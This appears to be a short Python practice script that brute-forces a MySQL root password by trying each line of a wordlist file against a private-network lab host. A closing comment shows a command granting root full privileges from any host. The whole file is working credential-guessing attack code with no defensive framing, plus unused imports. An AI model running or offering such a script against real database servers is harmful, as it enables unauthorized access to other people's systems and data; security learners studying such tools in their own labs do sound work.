from sys import flags
from numpy import rint
import pymysql
host = "192.168.191.129"
port = 3306
username = "root"
password = "root"
database = "test"
file = "password.txt"

def crack(host,port,file,database,username):
    flag = 0

    with open(file,"r") as f:
        for i in f:
            i = i.strip('\n')
            try:
                conn = pymysql.connect(user=username, passwd=i,db=database,host=host,port=port)
                print(f"find the password: {i}")
                return i
            except:
                print("",end="")
    

if __name__ == '__main__':
    password =  crack(host,port,file,database,username)
    # mysql> GRANT ALL PRIVILEGES ON *.* TO 'root'@'%' IDENTIFIED BY 'root' WITH GRANT OPTION;z